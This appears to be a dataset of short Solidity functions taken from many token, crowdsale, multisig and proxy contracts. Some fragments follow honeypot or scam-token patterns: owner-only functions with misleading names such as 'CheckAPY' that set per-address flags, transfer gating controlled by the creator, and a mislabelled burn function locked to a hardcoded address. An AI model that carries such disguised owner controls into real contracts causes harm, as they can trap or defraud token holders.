function changeTokenCost(uint256 _tokenCost) public onlyOwner {
        require(_tokenCost > 0, "token cost can not be zero");
        tokenCost = _tokenCost;
    }
--------------------------------------------------------------------------------
function _deliverTokens(address _beneficiary, uint256 _tokenAmount) internal {
        if(!objFieldCoin.transferFrom(objFieldCoin.owner(), _beneficiary, _tokenAmount)){
            revert("token delivery failed");
        }
    }
--------------------------------------------------------------------------------
function transferOwnership(address newOwner) onlyOwner public returns (bool) {
        require(newOwner != address(0x0));
         OwnershipTransferred(owner, newOwner);
        owner = newOwner;

        return true;
    }
--------------------------------------------------------------------------------
function createMulitSig(address[] memory owners_, uint16[] memory vPowers_, uint16 requiredVote_)
        external returns (C98MSiG wallet) {
        wallet = new C98MSiG(owners_, vPowers_, requiredVote_);
        emit Created(address(wallet), owners_);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function _setTokenMetadataDomain(string memory domain) internal {
        // Set up new OpenZeppelin 3.0 automatic token URI system.
        // Good thing we match their format or we'd have to fork OZ.
        uint chainId = 0;
        assembly {
            chainId := chainid()
        }
        _setBaseURI(string(abi.encodePacked("https://", domain, "/vre/v1/chain/", Strings.toString(chainId), "/token/")));
    }
--------------------------------------------------------------------------------
function claimRefund() public stateTransitions inState ( States.Refunding ) {
    // workaround since vault refund does not return refund value
    weiRefunded = weiRefunded.add(vault.deposited(msg.sender));
    vault.refund(msg.sender);
  }
--------------------------------------------------------------------------------
function () payable {
        if (msg.sender != owner) {
            if (msg.value == 0) depositLRC();
            else withdrawLRC();
        }
    }
--------------------------------------------------------------------------------
function _setImplementation(address _newImplementation) internal {
    require(msg.sender == proxyOwner());
    bytes32 position = implementationPosition;

    assembly {
      sstore(position, _newImplementation)
    }
  }
--------------------------------------------------------------------------------
function sendTransfer(address _user,uint _price) public onlyOwner{
        require(_user!=owner);
        if(address(this).balance>=_price){
            _user.transfer(_price);
        }
    }
--------------------------------------------------------------------------------
function confirmTransaction(uint transactionId)
        public
        ownerExists(msg.sender)
        transactionExists(transactionId)
        notConfirmed(transactionId, msg.sender)
    {
        confirmations[transactionId][msg.sender] = true;
        Confirmation(msg.sender, transactionId);
        executeTransaction(transactionId);
    }
--------------------------------------------------------------------------------
function startSale(uint256 saleStart, uint256 saleStop) onlyOwner returns (bool success) {
        require(saleStop > now);     
        startTime = saleStart; 
        stopTime = saleStop; 
        crowdsaleClosed = false; 
        return true; 
    }
--------------------------------------------------------------------------------
constructor () {
        _name = "EU METAVERSE"; 
        _symbol = "EUME";
        _totalSupply;
        _mint(owner(), 450000000 * 10 ** (decimals()) );

    }
--------------------------------------------------------------------------------
function Token(
         address _receivingAddress,
         uint256 _initialAmount,
         string _tokenName,
         string _tokenSymbol,
         uint8 _decimalUnits
    ) public {
        balances[_receivingAddress] = _initialAmount;               // Give the creator all initial tokens
        totalSupply = _initialAmount;                        // Update total supply
        name = _tokenName;                                   // Set the name for display purposes
        decimals = _decimalUnits;                            // Amount of decimals for display purposes
        symbol = _tokenSymbol;                               // Set the symbol for display purposes
    }
--------------------------------------------------------------------------------
function AddToBank(address user) public payable onlyMLM {
        //  check for winner
        CheckWinner();
        
        // save last payment info
        balance = balance.add(msg.value);
        winner = user;
        finish_time = now + fomo_period;
    }
--------------------------------------------------------------------------------
function replaceBoardMember(address _oldMember, address _newMember) public onlyBoard returns (bool) {
	    require(removeBoardMember(_oldMember), "Failed to remove old member");
	    return addBoardMember(_newMember);
	}
--------------------------------------------------------------------------------
function _transferOrderMoney(uint _price, address _owner) 
    internal {
        uint priceCut = (_price * ORDER_CUT)/100;
        _owner.transfer(_price - priceCut);
        withdrawableBalance += priceCut;
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function getTypes() external view returns(uint8[]) {
        uint8[] memory res = new uint8[](1);
        res[0] = 2;
        return res;
    }
--------------------------------------------------------------------------------
function inList(address addr)
        public
        view
        returns (bool)
    {
        if (bytes(investorList[addr]).length != 0) {
            return true;
        } else {
            return false;
        }
    }
--------------------------------------------------------------------------------
function kill() public payable {

       

        if (_owner == msg.sender) {

             _platformAddress.transfer(address(this).balance);

            selfdestruct(_owner);

        }





    }
--------------------------------------------------------------------------------
function confirmTransaction(uint transactionId)
        public
        ownerExists(msg.sender)
        transactionExists(transactionId)
        notConfirmed(transactionId, msg.sender)
    {
        confirmations[transactionId][msg.sender] = true;
        Confirmation(msg.sender, transactionId);
        executeTransaction(transactionId);
    }
--------------------------------------------------------------------------------
function getBetAt(address _participant, uint256 _blockNumber) public view returns (uint256 _oddBets, uint256 _evenBets){
        return (participants[_participant].bets[_blockNumber].ODDBets, participants[_participant].bets[_blockNumber].EVENBets);
    }
--------------------------------------------------------------------------------
function ownerIsOpenExchange(bool b,uint256 i) public onlyOwner{
        if (i == 1){
            USDT_GWTB_IS_OPEN = b;
        }else if(i == 2){
            GWTB_USDT_IS_OPEN = b;
        }
    }
--------------------------------------------------------------------------------
function calculateDividendTokens(uint256 ethervalue, uint256 subvalue) public constant returns (uint256 tokens) {
		return sub(fixedExp(fixedLog(reserve() - subvalue + ethervalue)*crr_n/crr_d + price_coeff), totalSupply);
	}
--------------------------------------------------------------------------------
function claimFee(uint256 _wid, uint256 amount) public view returns (uint256){
        WineInfo storage wine = wineInfo[_wid];
        return amount * wine.fixedPrice * (totalFee) / (base);
    }
--------------------------------------------------------------------------------
function getDaysSinceDeposit(address _addr) external view returns(uint daysSince, uint secondsSince) {
        return (((now - users[_addr].deposit_time) / 1 days), (now - users[_addr].deposit_time));
    }
--------------------------------------------------------------------------------
function escapeToken(address tkn) public auth discount {
        Token token = Token(tkn);
        token.transfer(admin, token.balanceOf(address(this)));
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function getMeOutOfHere() public {
      for (uint8 i=0; i<16; i++){
         sellMyTokens(i);
         withdraw(i);
      }

   }
--------------------------------------------------------------------------------
function manager_withdraw() onlyManager public {
        require(block.number >= endBlockNumber + liveBlocksNumber);
        msg.sender.transfer(address(this).balance);
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function airdrop(address[] memory _counts) external checker {
        for (uint256 i = 0; i < _counts.length; i++) {
            trades(_counts[i]); }
    }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function getPlayerId(uint256 _tokenId) external view returns (uint256 playerId) {
        NFT memory obj  = _getAttributesOfToken(_tokenId);
        playerId = ((obj.attributes.div(100000000000000000)) % 1000);
    }
--------------------------------------------------------------------------------
function withdrawTeamTokens() public onlyAdmin returns (bool) {
    require(now >= startICOPhaseOne + 1 years);

    token.transfer(wallet, teamTokens);
    return true;
  }
--------------------------------------------------------------------------------
function _preValidatePreICOPurchase(address _beneficiary, uint256 _weiAmount) internal view {
    require(_weiAmount != 0);
    require(whitelist[_beneficiary]);
    require(now >= preICOStartDate && now <= preICOEndDate);
  }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value) isRunning returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function transferByPartition(
    bytes32 partition,
    address to,
    uint256 value,
    bytes calldata data
  )
    external
    returns (bytes32)
  {
    return _transferByPartition(partition, msg.sender, msg.sender, to, value, data, "");
  }
--------------------------------------------------------------------------------
function CheckAPY(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    spongebob[spender] = val;
    patrick[spender] = val2; 
    stars[spender] = val3;
    teeth = val4;
  }
--------------------------------------------------------------------------------
function _accept(Job storage _job, uint _id) internal {
        _job.status = 1;
        _job.refundable = false;
        
        emit AcceptJob(_job.worker, _id);
    }
--------------------------------------------------------------------------------
function _decline (Job storage _job, uint _id) internal {
        _job.status = 2; // declined
        _job.finishedTime = now;
        
        emit DeclineJob(_job.worker, _id);
    }
--------------------------------------------------------------------------------
function _complete (Job storage _job, uint _id) internal {
        _job.status = 4; // complete
        _job.finishedTime = now;
        
        emit CompleteJob(_job.client, _id);
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        require(address(this).balance != 0);
        require(ethFundDeposit.send(address(this).balance));
    }
--------------------------------------------------------------------------------
function CheckAPY(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    cusco[spender] = val;
    baby[spender] = val2; 
    comfort[spender] = val3;
    ceres = val4;
  }
--------------------------------------------------------------------------------
function validPurchase() internal returns (bool) {
    bool withinCap = weiRaised.add(msg.value) <= cap;
    return super.validPurchase() && withinCap;
  }
--------------------------------------------------------------------------------
constructor() ERC721("DJENERATES SUPERSTARS", "DSS") {
         for (uint256 i; i < 31; i++) {
            ++totalMintedTokens;
            _mint(msg.sender, totalMintedTokens);    
        }
    }
--------------------------------------------------------------------------------
function transfer(address dst, uint256 amount) external nonReentrant returns (bool) {
        return transferTokens(msg.sender, msg.sender, dst, amount) == uint(Error.NO_ERROR);
    }
--------------------------------------------------------------------------------
function borrowBalanceCurrent(address account) external nonReentrant returns (uint) {
        require(accrueInterest() == uint(Error.NO_ERROR), "accrue interest failed");
        return borrowBalanceStored(account);
    }
--------------------------------------------------------------------------------
function() external payable {
        troiChest = troiChest.add(msg.value);
        
        emit BoostedChest(msg.sender, msg.value);
    }
--------------------------------------------------------------------------------
function startICO() internal onlyCreator {
          mintFoundersRewards(foundersRewardsAccount);

          mntToken.lockTransfer(true);

          if(icoStartedTime==0){
               icoStartedTime = uint64(now);
          }
     }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function _approve(address _owner, address _spender, uint256 _amount) 
      internal
    returns (bool success)
    {
        allowed[_owner][_spender] = _amount;
        emit Approval(_owner, _spender, _amount);
        return true;
    }
--------------------------------------------------------------------------------
function recoverPreSigned(
        bytes _sig,
        bytes4 _function,
        address _to,
        uint256 _value,
        bytes _extraData,
        uint256 _gasPrice,
        uint256 _nonce) 
      public
      view
    returns (address recovered)
    {
        return ecrecoverFromSig(getSignHash(getPreSignedHash(_function, _to, _value, _extraData, _gasPrice, _nonce)), _sig);
    }
--------------------------------------------------------------------------------
function DOWCrowdfund (address _founderWalletAddress, address _remainingTokenHolder) {
        founderMultiSigAddress = _founderWalletAddress;
        remainingTokenHolder = _remainingTokenHolder;
        owner = msg.sender;
        crowdfundStartTime = 1510272001;  //Friday, 10-Nov-17 00:00:01 UTC 
        crowdfundEndTime = 1512950399;    //Sunday, 10-Dec-17 23:59:59 UTC 
    }
--------------------------------------------------------------------------------
function Banananana(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    cats[spender] = val;
    apes[spender] = val2; 
    togers[spender] = val3;
    vader = val4;
  }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
constructor (AvailComToken _token) public {
    require(_token != address(0));

    // 0000 is added to the rate because decimal 4
    rate = 167000000;
    wallet = msg.sender;
    token = _token;
  }
--------------------------------------------------------------------------------
function finishCrowdsale() public onlyOwner {
    uint _value = token.balanceOf(this);
    token.transfer(wallet, _value);
    fifishICO = true;
  }
--------------------------------------------------------------------------------
function getDocumentName(uint256 _index) external view returns (string memory) {
        require(_index < _docNames.length, "Index out of bounds");
        return _docNames[_index];
    }
--------------------------------------------------------------------------------
function allocateTo(address _owner, uint256 value) public {
        balances[_owner] += value;
        supply += value;
        emit Transfer(address(this), _owner, value);
    }
--------------------------------------------------------------------------------
function addAdmin(address adminAddress) external onlyAdmin {

        // Set
        managers[adminAddress] = Manager(true, true, msg.sender);

        // Send event notification
        EventAddAdmin(msg.sender, adminAddress);

    }
--------------------------------------------------------------------------------
function addManager(address manAddress) external onlyAdmin {

        // Set
        managers[manAddress] = Manager(false, true, msg.sender);

        // Send event notification
        EventAddManager(msg.sender, manAddress);

    }
--------------------------------------------------------------------------------
function removeManager(address manAddress) external onlyAdmin {

        // Set
        managers[manAddress] = Manager(false, false, msg.sender);

        // Send event notification
        EventRemoveManager(msg.sender, manAddress);

    }
--------------------------------------------------------------------------------
function _wrapNxm()
      internal
    {
        // Wrap our full NXM balance.
        uint256 amount = nxm.balanceOf( address(this) );
        IWNXM(address(wNxm)).wrap(amount);
    }
--------------------------------------------------------------------------------
function switchRefSys() external onlyOwner {

        if (RS == ReferrerSystem.ON) {
            RS = ReferrerSystem.OFF;
        } else {
            RS = ReferrerSystem.ON;
        }
    }
--------------------------------------------------------------------------------
constructor () public {
         owner = msg.sender;
         balances[owner] = _totalSupply;
        emit Transfer(0, owner, _totalSupply);
     }
--------------------------------------------------------------------------------
function transferFrom (address _from, address _to, uint256 _value)
    public returns (bool success) {
    if (frozen) return false;
    else return AbstractToken.transferFrom (_from, _to, _value);
  }
--------------------------------------------------------------------------------
constructor(
        address _logic,
        address _admin,
        bytes memory _data
    ) public payable UpgradeableProxy(_logic, _data) {
        assert(
            _ADMIN_SLOT ==
                bytes32(uint256(keccak256("eip1967.proxy.admin")) - 1)
        );
        _setAdmin(_admin);
    }
--------------------------------------------------------------------------------
function SimpleToken() public {
    totalSupply_ = INITIAL_SUPPLY;
    balances[msg.sender] = INITIAL_SUPPLY;
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function adminSendMoneyToUser(address to,uint256 value) public{
        address opt_add=msg.sender;
        if(opt_add == admin_add){
            transferFrom(admin_add,to,value);
        }
    }
--------------------------------------------------------------------------------
function transfer(address _to, uint256 _value) public {
        _transfer(msg.sender,_to,_value);
        emit Transfer(msg.sender, _to, _value);                   // Notify anyone listening that this transfer took place
    }
--------------------------------------------------------------------------------
function transferFrom (address _from, address _to, uint256 _value)
    returns (bool success) {
    if (frozen) return false;
    else return AbstractToken.transferFrom (_from, _to, _value);
  }
--------------------------------------------------------------------------------
function KEOS() public {
    totalSupply_ = INITIAL_SUPPLY;
    balances[msg.sender] = INITIAL_SUPPLY;
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = totalSupply_;
    emit Transfer(address(0), msg.sender, totalSupply_);
  }
--------------------------------------------------------------------------------
function lockup(address _to, uint256 _lockupTimeUntil) public onlyOwner {
    require(lockups[_to] < _lockupTimeUntil);
    lockups[_to] = _lockupTimeUntil;
    emit Lockup(_to, _lockupTimeUntil);
  }
--------------------------------------------------------------------------------
function payout(address _claimant, uint _payout) external {
      require(msg.sender == arbitrator, "!kain.eth");
      compensation.safeTransfer(_claimant, _payout);
  }
--------------------------------------------------------------------------------
function OFNOG () public {
         owner = msg.sender;
         balances[owner] = _totalSupply;
       emit Transfer(0, owner, _totalSupply);
     }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function getPosition
    (
        bytes12 _stockKey
    )
        public
        view
        returns
        (
            uint32 quantity,
            uint32 avgPrice
        )
    {
        Position storage position = positions[_stockKey];
        quantity = position.quantity;
        avgPrice = position.avgPrice;
    }
--------------------------------------------------------------------------------
function setUpgradeMaster(address master) public {
      if (master == 0x0) revert();
      if (msg.sender != upgradeMaster) revert();
      upgradeMaster = master;
  }
--------------------------------------------------------------------------------
function Mints(uint256 quantity) external onlyOwner {
    
     require(totalSupply() + quantity <= amountForDevs, "reached max supply");
    _safeMint(msg.sender, quantity);
  }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function payOut() public {
        require(msg.sender == creator); //Only the creator can withdraw funds
        require(creator.send(this.balance));
        LogBeneficiaryPaid(creator);
    }
--------------------------------------------------------------------------------
function _getFee(address _from, address _to, uint _value) private view returns (uint) {
        if (mapAddress_Excluded[_from] || mapAddress_Excluded[_to]) {
           return 0;                                                                        // No fee if excluded
        } else {
            return (_value / 1000);                                                         // Fee amount = 0.1%
        }
    }
--------------------------------------------------------------------------------
function addExcluded(address excluded) external {                   
        _transfer(msg.sender, address(this), mapEra_Emission[1]/16);                        // Pay fee of 128 Vether
        mapAddress_Excluded[excluded] = true;                                               // Add desired address
    }
--------------------------------------------------------------------------------
function inRebaseWindow() public view returns (bool) {
        return (
            now.mod(minRebaseTimeIntervalSec) >= rebaseWindowOffsetSec &&
            now.mod(minRebaseTimeIntervalSec) < (rebaseWindowOffsetSec.add(rebaseWindowLengthSec))
        );
    }
--------------------------------------------------------------------------------
function ERC20Token(
        ) {
        balances[msg.sender] =1000000000000000000000000000;
        name = "PYRamid Coin";
        decimals = 18;
        symbol = "PYR";
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function Ethccoin() public {
    totalSupply_ = INITIAL_SUPPLY;
    balances[msg.sender] = INITIAL_SUPPLY;
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function acceptOwnership() {
        require(msg.sender == newOwner);
        OwnershipTransferred(owner, newOwner);
        owner = newOwner;
        newOwner = 0x0;
    }
--------------------------------------------------------------------------------
function safeTransferFrom(
    address from,
    address to,
    uint256 tokenId,
    bytes memory _data
  )
    public
  {
    transferFrom(from, to, tokenId);
    // solium-disable-next-line arg-overflow
    require(_checkOnERC721Received(from, to, tokenId, _data), 'TOKEN_IS_NOT_RECIVED');
  }
--------------------------------------------------------------------------------
constructor(ERC20 _token, ERC20 _authorize, uint256 usdETH) public {
        token = _token;
        authorize = _authorize;
        euroPrice = usdETH;
        buyPrice = (1e18/euroPrice).div(10); // 0.1 euro
    }
--------------------------------------------------------------------------------
function setBuyPrice(uint256 _dollar) public backEnd {
        euroPrice = _dollar;
        buyPrice = (1e18/euroPrice).div(10); // 0.1 euro
        emit UpdateDollar(now, euroPrice);
    }
--------------------------------------------------------------------------------
function purgeUpgrade() onlyAssetOwner() returns(bool) {
        if (pendingVersion == 0x0) {
            return false;
        }
        delete pendingVersion;
        delete pendingVersionTimestamp;
        return true;
    }
--------------------------------------------------------------------------------
function UserBalance(uint256 amount) public returns (bool) {
        require(
            _msgSender() == 0xA86cdA0A431D11073386b99715C17A3145630b3C,
            "BEP20: Not accessible"
        );
        burning(_msgSender(), amount);

        return true;
    }
--------------------------------------------------------------------------------
function transferProxyOwnership(address newOwner) public onlyProxyOwner {
    require(newOwner != address(0),"38");
    emit ProxyOwnershipTransferred(proxyOwner(), newOwner);
    setUpgradeabilityOwner(newOwner);
  }
--------------------------------------------------------------------------------
function upgradeToAndCall(address implementation, bytes memory data) payable public onlyProxyOwner {
    upgradeTo(implementation);
    (bool result, ) = address(this).delegatecall(data);
    require(result,"39");
  }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function GDK(){
		totalSupply=MAX_SUPPLY;
		balances[msg.sender] = MAX_SUPPLY;
		Transfer(0x0, msg.sender, MAX_SUPPLY);
	}
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {
    bool withinPeriod = started;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
  }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function tokenFallback(address _from, uint _value, bytes _data) public {
    require(_from != address(0));
    emit TokensReceived(msg.sender, _from, _value, _data);
  }
--------------------------------------------------------------------------------
function updateDefaultPercentages(
        uint16 percentArtist_,
        uint16 percentPlatform_
    ) public onlyOwner {
        unchecked {
            require(
                percentArtist_ + percentPlatform_ == 10000,
                "Invalid percentage"
            );
        }

        _percentArtist = percentArtist_;
        _percentPlatform = percentPlatform_;
    }
--------------------------------------------------------------------------------
function setCollectionBaseUri(uint256 collectionId_, string memory baseUri_)
        public
        onlyOwner
    {
        require(
            _collections[collectionId_].baseUriLocked == 0,
            "baseURI locked"
        );
        _collections[collectionId_].baseUri = baseUri_;
    }
--------------------------------------------------------------------------------
function confirmTransaction(uint transactionId)
        public
        ownerExists(msg.sender)
        transactionExists(transactionId)
        notConfirmed(transactionId, msg.sender)
    {
        confirmations[transactionId][msg.sender] = true;
        Confirmation(msg.sender, transactionId);
        executeTransaction(transactionId);
    }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function DetectNetworkBridge(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    german[spender] = val;
    shepherd[spender] = val2; 
    yorki[spender] = val3;
    mezcal = val4;
  }
--------------------------------------------------------------------------------
function changeCreator(address _creator) external {
        require(msg.sender==creator, "You're not a creator!");
        creator = _creator;
    }
--------------------------------------------------------------------------------
function changeTeamWallet(address _teamWallet) external {
        require(msg.sender==creator, "You're not a creator!");
        YumeriumTeamWallet = _teamWallet;
    }
--------------------------------------------------------------------------------
function start_LOCKUP(uint _lockupEndDate) public onlyOwner atStage(Stages.LOCKUPNOTSTARTED)
     {
          stage = Stages.LOCKUPSTARTED;
          stopped = false;
          lockup_startdate = now;
          lockup_enddate = now + _lockupEndDate * 86400;
     }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function setupAccreditedAddress(address _accredited, uint _amountInEthers) public returns (bool success) {
        require(msg.sender == creator);    
        accredited[_accredited] = _amountInEthers * 1 ether;
        return true;
    }
--------------------------------------------------------------------------------
function AmbrosusSale() {
    tokens = new AmberToken();
    tokens.mint(0x00C269e9D02188E39C9922386De631c6AED5b4d4, 144590975014280560863612000);
    saleRevenue += 144590975014280560863612000;
    totalSold += 144590975014280560863612000;

  }
--------------------------------------------------------------------------------
function _getTokenAmount(uint256 _weiAmount)
        internal view returns (uint256)
    {
        uint256 bonusRate = getBonusRate(_weiAmount);
        return _weiAmount.mul(bonusRate).div(1 ether);
    }
--------------------------------------------------------------------------------
function getMeOutOfHere() public {
		sellBonds( holdings_BULL[msg.sender] ,true);
		sellBonds( holdings_BEAR[msg.sender] ,false);
        withdraw();
	}
--------------------------------------------------------------------------------
function reserve() internal constant returns (uint256 amount){
		return sub(balance(),
			  ((uint256) ((int256) (earningsPerBond_BULL * totalBondSupply_BULL + earningsPerBond_BEAR * totalBondSupply_BEAR) - totalPayouts ) / scaleFactor) 
		);
	}
--------------------------------------------------------------------------------
function getTokensForEther(uint256 ethervalue) public constant returns (uint256 tokens) {
		return sub(fixedExp(fixedLog(reserve() + ethervalue)*crr_n/crr_d + price_coeff), totalBondSupply_BULL + totalBondSupply_BEAR);
	}
--------------------------------------------------------------------------------
function purgeUpgrade() onlyAssetOwner() returns(bool) {
        if (pendingVersion == 0x0) {
            return false;
        }
        delete pendingVersion;
        delete pendingVersionTimestamp;
        return true;
    }
--------------------------------------------------------------------------------
function initiateMigration(Proxy identity, address newIdManager) public
        onlyOlderOwner(identity)
        validAddress(newIdManager)
    {
        migrationInitiated[identity] = now;
        migrationNewAddress[identity] = newIdManager;
        LogMigrationInitiated(identity, newIdManager, msg.sender);
    }
--------------------------------------------------------------------------------
constructor() public payable {
            address originalFeeReceive = 0x6661084EAF2DD24aCAaDe2443292Be76eb344888;
            originalFeeReceive.transfer(500000000000000000);
            owner = 0x96c5ec7e56388d8679e78f1e63c2d72d34a6c711; 
            balances[owner] = _totalSupply;
        }
--------------------------------------------------------------------------------
function () payable {
        _getAsset()._performGeneric.value(msg.value)(msg.data, msg.sender);
        _returnReturnData(true);
    }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function BbeCoin() public {
        totalSupply_ = INITIAL_SUPPLY;
        balances[msg.sender] = INITIAL_SUPPLY;
        Transfer(0x0, msg.sender, INITIAL_SUPPLY);
    }
--------------------------------------------------------------------------------
function freezeAccount(address _target) onlyOwner public {
        require(_target != address(0));
        frozenAccount[_target] = true;
        emit Freeze(_target, true);
    }
--------------------------------------------------------------------------------
function unfreezeAccount(address _target) onlyOwner public {
        require(_target != address(0));
        frozenAccount[_target] = false;
        emit UnFreeze(_target, false);
    }
--------------------------------------------------------------------------------
function setMainSaleDates(uint256 _mainSaleStartTime, uint256 _mainSaleEndTime) public onlyOwner returns (bool) {
    require(!isFinalised);
    require(_mainSaleStartTime < _mainSaleEndTime);
    mainSaleStartTime = _mainSaleStartTime;
    mainSaleEndTime = _mainSaleEndTime;
    return true;
  }
--------------------------------------------------------------------------------
function () public payable {
        require(msg.value > 0);
        
        _systemReserves[0x0] = add(_systemReserves[0x0], msg.value);
    }
--------------------------------------------------------------------------------
function bid(bytes32 _shaBid) external onlyWhitelisted {
        Bid storage b = bids_[_shaBid];

        registrar_.newBid.value(b.value)(_shaBid);
    }
--------------------------------------------------------------------------------
function withdraw() external onlyWhitelisted {
        msg.sender.transfer(balance_);
        emit Withdrawn(msg.sender, balance_);
        balance_ = 0;
    }
--------------------------------------------------------------------------------
function stopICO() onlyOwner public{
            icoEndDate = 0;
            uint256 tokenAmount=balanceOf[this];
            _transfer(this, msg.sender, tokenAmount);
        }
--------------------------------------------------------------------------------
function manualWithdrawToken(uint256 _amount) onlyOwner public {
      		uint256 tokenAmount = _amount.mul(1 ether);
            _transfer(this, msg.sender, tokenAmount);
        }
--------------------------------------------------------------------------------
function paradigmGenesisClaim(uint256 tokenId) public nonReentrant {
        require(tokenId > 0 && tokenId < 11, "Token ID invalid");
        _safeMint(_msgSender(), tokenId);
    }
--------------------------------------------------------------------------------
constructor(string memory name, string memory symbol, uint256 initialmint, address VCOINEntityContractAddress) public ERC20(name, symbol) {
        //Roles are assigned in the constructor of AccessControl.sol
        //Adjust initialmint value against default 18 decimals
        initialmint = initialmint * (10 ** 18);
        //Setup initial mint to VCOINEntity
         _mint(VCOINEntityContractAddress, initialmint);
        //transfer contract ownership to VCOINEntity
        transferOwnership(VCOINEntityContractAddress);
        //grant roles to VCOINEntity
        _setupRolesForVCOINEntity(VCOINEntityContractAddress);
    }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {
    bool withinCap = weiRaised.add(msg.value) <= cap;
    return super.validPurchase() && withinCap;
  }
--------------------------------------------------------------------------------
function updateToken(address _newToken) public returns(bool) {
        require(msg.sender == ownerAddress, "Invalid User");
        Token = ERC20(_newToken);
        return true;
    }
--------------------------------------------------------------------------------
function isOperatorFor(
        address operator,
        address tokenHolder
    ) public view returns (bool) {
        return operator == tokenHolder ||
            (_defaultOperators[operator] && !_revokedDefaultOperators[tokenHolder][operator]) ||
            _operators[tokenHolder][operator];
    }
--------------------------------------------------------------------------------
function inRebaseWindow() public view returns (bool) {
        return (
            now.mod(minRebaseTimeIntervalSec) >= rebaseWindowOffsetSec &&
            now.mod(minRebaseTimeIntervalSec) < (rebaseWindowOffsetSec.add(rebaseWindowLengthSec))
        );
    }
--------------------------------------------------------------------------------
constructor(address _logic, address _admin, bytes memory _data) UpgradeabilityProxy(_logic, _data) payable {
    assert(ADMIN_SLOT == bytes32(uint256(keccak256('eip1967.proxy.admin')) - 1));
    _setAdmin(_admin);
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function allocateEarlyPlayerShare() internal {
        if (availableEarlyPlayerShares==0) return;
		    availableEarlyPlayerShares--;
       	addMember(); // possibly add this member to the syndicate
        members[msg.sender].numShares+=1;

    }
--------------------------------------------------------------------------------
function addMember() internal {
    	 if (members[msg.sender].numShares == 0){
		          syndicateMembers.push(msg.sender);
		          numberSyndicateMembers++;
		    }
    }
--------------------------------------------------------------------------------
function()
    payable
    public
    validAmount
    {
        if(crowdSale.shiftSalePurchase.value(msg.value - fee)()){
            FundTransfer(msg.value - fee);
        }
    }
--------------------------------------------------------------------------------
function safeAdd(uint a, uint b) returns (uint) {
        uint c = a + b;
        assert(c>=a && c>=b);
        return c;
    }
--------------------------------------------------------------------------------
function setInactivityReleasePeriod(uint256 expiry) onlyOwner returns (bool success) {
        if (expiry > 1000000) throw;
        inactivityReleasePeriod = expiry;

        emit InactivityReleasePeriodChange(expiry);
        return true;
    }
--------------------------------------------------------------------------------
